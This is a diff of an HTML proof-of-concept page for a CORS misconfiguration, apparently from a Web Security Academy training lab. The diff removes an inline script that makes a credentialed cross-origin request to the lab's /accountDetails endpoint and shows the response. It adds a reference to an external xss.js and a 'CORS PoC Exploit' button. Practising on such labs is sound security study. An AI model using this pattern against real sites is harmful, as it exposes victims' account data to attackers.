@@ -1,19 +1,17 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
   <head>
+    <script type="text/javascript" src="xss.js">
+    </script>
     <meta charset="utf-8">
     <title></title>
-    <script type="text/javascript">
-      var xhr = new XMLHttpRequest();
-      xhr.onload = function() {
-           alert(this.responseText);
-      }
-      xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
-      xhr.withCredentials = true;
-      xhr.send();
-    </script>
   </head>
   <body>
-
+   <center>
+     <h2>CORS PoC Exploit </h2>
+     <h3>Show full content of page</h3>
+     <div id="report">
+       <button type="button" onclick="cors()">ButtonEg</button>
+     </div>
   </body>
 </html>
